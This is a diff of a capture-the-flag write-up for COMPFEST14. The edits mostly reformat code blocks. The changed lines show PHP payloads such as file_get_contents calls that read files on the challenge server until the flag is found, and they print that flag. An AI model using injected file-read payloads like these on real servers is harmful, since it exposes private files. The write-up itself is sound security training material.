@@ -127,17 +127,20 @@ After that, let's look at the output!
 We see some txt files in there. It could be the flag! Let's try one of them.
 Let's change the payload.
 
-```payload = "echo file_get_contents(\'/Hey.txt\');"
+```
+payload = "echo file_get_contents('/Hey.txt');"
 Output: Sorry, wrong guy :v ```
 
 Bruh, let's try the next one.
 
-```payload = "echo file_get_contents(\'/Heyhey.txt\');"
+```
+payload = "echo file_get_contents('/Heyhey.txt');"
 Output: Hai! Hai! (^_^)  ```
 
-Still wrong, the next one maybe?
+Still not it, the next one maybe?
 
-```payload = "echo file_get_contents(\'/Heyheyhey.txt\');"
+```
+payload = "echo file_get_contents('/Heyheyhey.txt');"
 Output: COMPFEST14{welcome_to_the_root} ```
 
 And just like that, the flag is found!
